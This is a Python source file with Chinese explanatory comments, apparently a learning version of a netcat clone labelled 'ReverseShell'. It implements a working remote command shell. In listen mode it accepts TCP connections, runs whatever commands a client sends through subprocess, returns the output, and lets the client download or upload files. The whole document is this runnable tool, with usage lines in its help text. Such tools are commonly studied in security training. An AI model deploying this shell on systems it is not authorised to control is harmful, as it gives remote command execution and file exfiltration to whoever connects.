import argparse
import socket
import shlex
import subprocess
import sys
import textwrap
import threading
import os

# execute函数用于接受一条命令并执行，然后将结果作为一段字符串返回
def execute(cmd):
    if cmd.startswith('cd '):
        # 切换目录
        os.chdir(cmd[3:].strip())
        return os.getcwd() + '>'
    else:
        cmd = cmd.strip()
        if not cmd:
            return
        # subprocess库提供了一组强大的进程创建接口，可以通过多种方式调用其他程序。
        # check_output函数会在本机运行一条命令，并返回该命令的输出
        output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
        return output.decode() + os.getcwd() + '>'

def get_file(buffer, socket):
    cmd, filename = buffer.split(" ")
    filename = filename.replace("\n", "")
    file_size = int(socket.recv(64).decode().strip('\n'))
    print("File Size:%s" % (file_size))

    with open(filename, "wb") as f:
        received_size = 0
        while received_size < file_size:
            size = min(4096, file_size - received_size)
            data = socket.recv(size)
            f.write(data)
            received_size += len(data)
            print("Download: {:.2f}%".format(received_size / file_size * 100))
    print("File '{}' downloaded successfully.".format(filename))
    print('Enter Command >', end="")

def send_file(cmd, client_socket):
    filename = cmd.split()[1]
    if os.path.isfile(filename):  # 判断文件是否存在
        size = os.path.getsize(filename)  # 获取文件大小
        client_socket.send(str(size).encode() + b'\n')  # 发送数据长度

        with open(filename, "rb") as f:
            client_socket.send(f.read())
    else:
        client_socket.send("File Not Exist".encode())

class SimpleNetcat:
    def __init__(self, args):
        # 我们用main代码块传进来的命令行参数，初始化一个NetCat对象，然后创建一个socket对象
        self.args = args
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    # 如果NetCat对象是接收方，run就执行listen函数
    # 如果是发送方，run就执行send函数
    def run(self):
        if self.args.listen:
            self.listen()
        else:
            # 用于启动时输出
            print('Enter the first command >',end='')
            self.send()

    # 监听数据
    def listen(self):
        self.socket.bind((self.args.target, self.args.port))
        # listen(n)传入的值, n表示的是服务器拒绝(超过限制数量的)连接之前，操作系统可以挂起的最大连接数量。
        self.socket.listen(5)

        # 用一个循环监听新连接,并把已连接的socket对象传递给handle函数执行任务
        while True:
            # accept()等待传入连接。,返回代表连接的新套接字以及客户端的地址。
            client_socket, _ = self.socket.accept()
            # 给每个客户端创建一个独立的线程进行管理
            client_thread = threading.Thread(target=self.handle, args=(client_socket,))
            client_thread.start()

    # 执行传入的任务
    def handle(self, client_socket):
        # 如果要执行命令，handle函数就会把该命令传递给execute函数
        # 然后把输出结果通过socket发回去
        if self.args.command:
            # 创建shell，先创建一个循环，向发送方发一个提示符，
            # 然后等待其发回命令。每收到一条命令，就用execute函数执行它，然后把结果发回发送方
            while True:
                try:
                    cmd_buffer = b''
                    # 循环接收发送端命令
                    while '\n' not in cmd_buffer.decode():
                        cmd_buffer += client_socket.recv(64)
                    cmd = cmd_buffer.strip().decode()
                    if cmd.startswith("get"):
                        send_file(cmd, client_socket)
                    elif cmd.startswith("upload"):
                        get_file(cmd, client_socket)
                    else:
                        response = execute(cmd_buffer.decode())
                        if response:
                            client_socket.send(response.encode())
                except Exception as e:
                    print(f'Server killed {e}')
                    self.socket.close()
                    sys.exit()
    def send(self):
        # 连接到target:port
        self.socket.connect((self.args.target, self.args.port))
        # 创建个try/catch块，这样就能直接用Ctrl+C组合键手动关闭连接
        try:
            # 创建一个大循环，接收target返回的数据
            while True:
                # 等待用户输入新的内容，再把新的内容发给target
                buffer = input() + '\n'
                self.socket.send(buffer.encode())
                if buffer.startswith("get"):
                    get_file(buffer, self.socket)
                elif buffer.startswith("upload"):
                    send_file(buffer, self.socket)
                else:
                    recv_len = 4096
                    response = ''
                    # 读取socket本轮返回的数据,如果socket里的数据目前已经读到头，就退出小循环
                    while recv_len:
                        data = self.socket.recv(4096)
                        recv_len = len(data)
                        response += data.decode('utf-8', errors='ignore')
                        if recv_len < 4096:
                            break
                    # 检查刚才有没有实际读出什么东西来，如果读出了什么，就输出到屏幕上
                    if response:
                        print(response, end='')
        except KeyboardInterrupt:
            print("User Terminated.")
            self.socket.close()
            sys.exit()

if __name__ == "__main__":
    # argparse库是python标准库里面用来处理命令行参数的库
    # 传递不同的参数，就能控制这个程序执行不同的操作
    parser = argparse.ArgumentParser(       # 创建一个解析对象
        description="ReverseShell",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        # 帮助信息,程序启动的时候如果使用--help参数，就会显示这段信息
        epilog=textwrap.dedent(
            """
                python Simple_Netcat.py -t <IP> -p 5555 -l -c   # command shell
                python Simple_Netcat.py -t <IP> -p 5555         # connect to server
                get <file>                                      # download file
                upload <file>                                   # upload file
            """
        ),
    )

    # -c参数,打开一个交互式的命令行shell；
    parser.add_argument("-c", "--command", action="store_true", help="command shell")
    # -l参数,创建一个监听器
    parser.add_argument("-l", "--listen", action="store_true", help="listen ")
    # -p参数,指定要通信的端口
    parser.add_argument("-p", "--port", type=int, default=5555, help="specified port ")
    # -t参数,指定要通信的目标IP地址
    parser.add_argument("-t", "--target", default="127.0.0.1", help="specified IP")

    args = parser.parse_args()

    nc = SimpleNetcat(args)
    nc.run()
